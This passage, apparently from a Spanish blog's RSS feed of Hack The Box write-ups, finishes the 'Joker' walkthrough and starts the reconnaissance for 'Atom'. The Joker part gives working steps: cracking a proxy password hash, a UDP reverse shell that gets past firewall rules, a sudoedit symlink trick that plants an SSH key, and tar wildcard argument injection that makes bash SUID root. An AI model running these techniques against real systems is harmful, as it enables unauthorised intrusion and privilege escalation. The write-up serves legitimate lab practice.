&lt;p&gt;Vamos a proceder a crackearlas con &lt;code&gt;john&lt;/code&gt; y obtenemos unas credenciales validas &lt;code&gt;kalamari:ihateseafood&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateseafood     (kalamari)
1g 0:00:00:19 DONE (2023-08-25 23:57) 0.05173g/s 378636p/s 378636c/s 378636C/s ihateyou456!..ihatepz
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que contamos con credenciales validas, podemos usarlas para el proxy que anteriormente agregamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como ahora estamos pasando correctamente por el proxy, podemos enumerar los servicios de la maquina victima como si estuvieramos localmente.&lt;/p&gt;

&lt;p&gt;Si accedemos a nuestra ip local, vemos que en el puerto 80 hay un contenido diferente que corresponde a &lt;code&gt;shorty url&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya que estamos en otro servicio, podemos enumerar rutas disponibles y esta vez emplearemos &lt;code&gt;gobuster&lt;/code&gt; para hacerlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gobuster dir -t 150 -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://kalamari:ihateseafood@10.10.10.21:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/08/26 00:11:32 Starting gobuster in directory enumeration mode
===============================================================
/list                 (Status: 301) [Size: 251] [--&amp;gt; http://127.0.0.1/list/]
/console              (Status: 200) [Size: 1479]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Encontramos la ruta console y si vemos el contenido, tenemos acceso a una consola interactiva.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si interactuamos vemos que podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si queremos enviarnos una conexión a nuestra maquina usando &lt;code&gt;nc&lt;/code&gt; no tenemos exito, pero si visualizamos las reglas de conexión permitidas, observamos que solo estan permitidas las conexiones por &lt;code&gt;tcp&lt;/code&gt; del puerto 22 y 3128 y al contrario por &lt;code&gt;udp&lt;/code&gt; todas las conexiones estan permitidas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;'# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017'  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Teniendo en cuenta que por &lt;code&gt;udp&lt;/code&gt; todo esta permitido, vamos a mandarnos la conexión a traves de udp, solo debemos añadir el parametro &lt;code&gt;-u&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y recibimos la conexión.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443 -u
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.21.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
werkzeug
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que sigue como de costumbre es obtener una tty full interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
werkzeug@joker:~$ ^Z     
zsh: suspended  ncat -nlvp 443 -u
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443 -u
                                   reset xterm
werkzeug@joker:~$ export term=XTERM
werkzeug@joker:~$ export shell=BASH
werkzeug@joker:~$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez en el sitema como el usuario &lt;code&gt;werkzeug&lt;/code&gt;, vemos que tenemos asignado un permiso a nivel de sudoers donde podemos ejecutar el comando &lt;code&gt;sudoedit&lt;/code&gt; como el usuario &lt;code&gt;alekos&lt;/code&gt; sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que podemos ejecutar un archivo de nombre &lt;code&gt;layout.html&lt;/code&gt; que se encuentra en cualquier directorio dentro de la ruta &lt;code&gt;/var/www/*&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ ls -l
total 12
-rwxr-x--- 1 root     werkzeug  581 May 18  2017 manage-shorty.py
drwxr-x--- 5 root     werkzeug 4096 May 18  2017 shorty
drwxr-xr-x 2 werkzeug werkzeug 4096 May 18  2017 testing
werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ ls
layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que dentro del directorio testing se encuentra un archivo &lt;code&gt;layout.html&lt;/code&gt;, pero segun el privilegio que tenemos asignado el archivo &lt;code&gt;layout.html&lt;/code&gt; debe encontrarse dentro de dos subdirectorios cualquiera.&lt;/p&gt;

&lt;p&gt;Y dado que tenemos permiso de escritura en &lt;code&gt;testing&lt;/code&gt;, podemos crear dentro de este otro directorio y dentro el archivo &lt;code&gt;layout.html&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ mkdir test
werkzeug@joker:~/testing$ cd !$
cd test
werkzeug@joker:~/testing/test$ touch layout.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora usamos el comando &lt;code&gt;sudoedit&lt;/code&gt; vemos que no nos pide proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ver esto, lo que podemos tratar de hacer es aprovecharnos de este permiso y aprovecharnos del principio basico de claves rsa, mediante el cual al creemos el archivo &lt;code&gt;layout.html&lt;/code&gt; y que este sea un link simbolico a &lt;code&gt;/home/alekos/.ssh/authorized_keys&lt;/code&gt;, donde al insertar nuestra clave publica como &lt;code&gt;authorized_keys&lt;/code&gt;, podamos conectarnos sin necesidad de proporcionar una contraseña y al poder editar este archivo como el usuario &lt;code&gt;alekos&lt;/code&gt; sera este el que ejecute la acción.&lt;/p&gt;

&lt;p&gt;De este modo sera como si estuvieramos insertando nuestra clave publica mediante el archivo layout.html a el directorio &lt;code&gt;.ssh&lt;/code&gt; del usuario alekos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;werkzeug@joker:~/testing/test$ ln -s -f /home/alekos/.ssh/authorized_keys layout.html 
werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

werkzeug@joker:~/testing/test$ cat layout.html 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYvqYRwqRrHydQfmmP56U9Wkec5IS2odMcoFxXppd5IPdzzf6CIv3skuKorlyi8HZCbsHnhm57Fqzn3PZWZ7pp5rgFzTPneh4a4W7NJONRxsuRwT4SWWNzmSjINyQrWurhctekrh3rRuhDwtSIz9rTjFKNCsmTbk6Qm3Fx3+JfYuKhuq4lNwSo3QqU2+yNv+svzzs66sdq+E/2Z0bhoi5bubhwj5g739A5odh57Hey9AfNtsK9vcVOpL+yH9RAwNHfRSHxM8GJrInMc3Twb9a8FQ8MSNO7gXd2+ykRqP0L8TkNJMggNTpmCZctL7a1wJHbTjcj68JO9nmFJgyh0BZQ8wlQetcDgo0yQ3jIhoIvN7GzPyJbo5X3cFhw/2gXSxWVLRwk6e7RQELp2SZeEFXN6ycimU4tbWEOrexJO2VwZQp8ZWv46ffUj4c4jYAiZ81i3wVJoko0uLcE9KENb/0E+9dnx5uMLUDNXz8x9EFwOkN1qxD3skGtR3dXMFZFRKM= root@fmiracle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De este modo ahora podemos conectarnos como el usuario &lt;code&gt;alekos&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh alekos@10.10.10.21
The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.21' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos a su directorio personal y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cat user.txt 
fcbfa16ff0623562479c4a6a7e4897ba
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listando el contenido del directorio de &lt;code&gt;alekos&lt;/code&gt;, vemos dos directorio uno de &lt;code&gt;development&lt;/code&gt; el cual contiene scripts en &lt;code&gt;python&lt;/code&gt; y el directorio &lt;code&gt;backup&lt;/code&gt; el cual contiene archivos comprimidos con &lt;code&gt;tar&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cd development/
alekos@joker:~/development$ ls
__init__.py  application.py  data  models.py  static  templates  utils.py  views.py
alekos@joker:~/development$ cd ..
alekos@joker:~$ cd backup/
alekos@joker:~/backup$ ls
dev-1514134201.tar.gz  dev-1693005901.tar.gz  dev-1693006801.tar.gz  dev-1693007701.tar.gz  dev-1693008601.tar.gz  dev-1693009501.tar.gz  dev-1693010402.tar.gz
dev-1514134501.tar.gz  dev-1693006201.tar.gz  dev-1693007101.tar.gz  dev-1693008001.tar.gz  dev-1693008902.tar.gz  dev-1693009801.tar.gz  dev-1693010701.tar.gz
dev-1693005601.tar.gz  dev-1693006501.tar.gz  dev-1693007401.tar.gz  dev-1693008301.tar.gz  dev-1693009201.tar.gz  dev-1693010101.tar.gz  dev-1693011002.tar.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si descomprimimos alguno de los comprimidos, obsevamos que dentro de este vemos los mismos archivos que se encontraban en la ruta &lt;code&gt;development&lt;/code&gt;. Podemos intuir entonces que mediante una tarea que se ejecuta a intervalos regulares de tiempo, se esta comprimiendo todo el contenido del directorio &lt;code&gt;development&lt;/code&gt; y lo esta almancenando en &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/backup$ cp dev-1514134201.tar.gz /tmp/
alekos@joker:~/backup$ cd /tmp/
alekos@joker:/tmp$ ls
dev-1514134201.tar.gz  f  systemd-private-67c5a0aba61c4233b0464cb22f25c7cb-systemd-timesyncd.service-5cvsvV  vmware-root
alekos@joker:/tmp$ mkdir test
alekos@joker:/tmp$ cd test/
alekos@joker:/tmp/test$ mv ../dev-1514134201.tar.gz .
alekos@joker:/tmp/test$ tar -xf dev-1514134201.tar.gz 
alekos@joker:/tmp/test$ ls
__init__.py  application.py  data  dev-1514134201.tar.gz  models.py  static  templates  utils.py  views.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Viendo esto lo mas probable es que se este usando &lt;code&gt;tar&lt;/code&gt;, ejecutandolo de esta manera &lt;code&gt;tar -cf /development/*&lt;/code&gt; y dado el caso podriamos aprovechar el uso de Wildcards y tratar de obtener una shell.&lt;/p&gt;

&lt;p&gt;Si usamos nuestra web de confianza:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/tar/#shell&quot;&gt;gtfobins - tar&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vemos que para obtener una shell, podemos hacerlo con los siguientes parametros.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y como se esta utilizando Wildcards, podemos crearnos dos archivos de nombre &lt;code&gt;--checkpoint=1&lt;/code&gt; y &lt;code&gt;--checkpoint-action=exec=EJECUTA LO QUE QUIERAS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello al crear los archivos que contienen &lt;code&gt;-&lt;/code&gt;, debemos anteponer &lt;code&gt;--&lt;/code&gt; para hacerlo correctamente.&lt;/p&gt;

&lt;p&gt;En el segundo archivo que corresponde a la ejecución, voy a crearme un archivo en python el cual otorgue el permiso &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;alekos@joker:~/development$ cat abusing_wildcard.py 
import os

os.system(&quot;chmod u+s /bin/bash&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y seguidamente voy a crear los dos archivos necesarios, de modo que al ejecutarse el comando &lt;code&gt;tar&lt;/code&gt; sobre todos los archivos tomara los nombres de estos dos ultimos como parametros y en consecuencia ejecutara el comando asignado, otorgando el privilegio &lt;code&gt;suid&lt;/code&gt; a la bash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ touch -- --checkpoint=1
alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python abusing_wildcard.py'
alekos@joker:~/development$ ls -l
total 32
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:05 --checkpoint-action=exec=python abusing_wildcard.py
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:04 --checkpoint=1
-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
-rw-rw-r-- 1 alekos alekos   44 Aug 26 04:07 abusing_wildcard.py
-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py
drwxrwx--- 2 alekos alekos 4096 May 18  2017 data
-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
drwxr-x--- 2 alekos alekos 4096 May 18  2017 static
drwxr-x--- 2 alekos alekos 4096 May 18  2017 templates
-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pasado unos minutos listamos la bash y vemos que se le dio el permiso correspondiente de manera exitosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1041576 May 16  2017 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente lo que nos quedaria por hacer es convertimos como el usuario &lt;code&gt;root&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;alekos@joker:~/development$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root/
bash-4.3# cat root.txt 
bash-4.3# cat root.txt 
90fcbcbbb01891eec43448b6b6d7051b
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Fri, 25 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Joker</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Joker</guid>
        
        <category>SQUID Proxy Enumeration</category>
        
        <category>UDP Enumeration</category>
        
        <category>Abusing TFTP</category>
        
        <category>Getting Squid Proxy Credentials</category>
        
        <category>Cracking Hashes</category>
        
        <category>Internal port discovery via SQUID Proxy</category>
        
        <category>Abusing Interactive Console</category>
        
        <category>RCE Bypassing iptables rules</category>
        
        <category>UDP Reverse Shell</category>
        
        <category>Abusing Sudoers Privilege</category>
        
        <category>Abusing sudoedit</category>
        
        <category>Abusing Cron Job</category>
        
        <category>Abusing TAR Wildcards</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Atom - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Atom&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves &lt;code&gt;electron-builder&lt;/code&gt; donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de &lt;code&gt;portablekanban&lt;/code&gt; y finalmente despues de una enumeración del servicio de &lt;code&gt;redis&lt;/code&gt; obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario &lt;code&gt;Administrator&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Atom
❯ ls

 Atom
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.237
PING 10.10.10.237 (10.10.10.237) 56(84) bytes of data.
64 bytes from 10.10.10.237: icmp_seq=1 ttl=127 time=271 ms

--- 10.10.10.237 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 271.205/271.205/271.205/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.237 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:35 GMT
Initiating SYN Stealth Scan at 00:35
Scanning 10.10.10.237 [65535 ports]
Discovered open port 445/tcp on 10.10.10.237
Discovered open port 80/tcp on 10.10.10.237
Discovered open port 135/tcp on 10.10.10.237
Discovered open port 443/tcp on 10.10.10.237
Discovered open port 6379/tcp on 10.10.10.237
Discovered open port 5985/tcp on 10.10.10.237
Completed SYN Stealth Scan at 00:35, 26.77s elapsed (65535 total ports)
Nmap scan report for 10.10.10.237
Host is up, received user-set (0.20s latency).
Scanned at 2023-08-11 00:35:14 GMT for 27s
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
443/tcp  open  https        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
6379/tcp open  redis        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 23 (1.012KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80,135,443,445,5985,6379 10.10.10.237 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:36 GMT
Nmap scan report for 10.10.10.237
Host is up (0.21s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Heed Solutions
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s
| smb2-time: 
|   date: 2023-08-11T00:37:09
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-10T17:37:13-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;microsoft-ds Windows 10 Pro 19042&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5985&lt;/td&gt;
      &lt;td&gt;WINRM&lt;/td&gt;
      &lt;td&gt;Microsoft HTTPAPI httpd 2.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6379&lt;/td&gt;
      &lt;td&gt;REDIS&lt;/td&gt;
      &lt;td&gt;Redis key-value store&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

